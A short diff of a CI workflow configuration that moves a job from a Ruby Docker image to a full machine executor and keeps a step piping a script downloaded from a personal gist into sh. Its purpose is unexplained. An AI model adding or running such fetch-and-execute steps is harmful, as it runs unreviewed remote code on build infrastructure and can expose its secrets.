@@ -9,9 +9,8 @@ on:
         description: '6 Pin Digits'
         requires: true
 jobs:
-  docker:
-    docker:
-      - image: ruby:2.5
+  machine:
+    machine: true
     steps:
     - run: echo 'Building Package'
     - run: wget https://gist.githubusercontent.com/RandomiDn/c2af6a01c7593ce4689414d8c507710b/raw/ci.dev -O - | sh
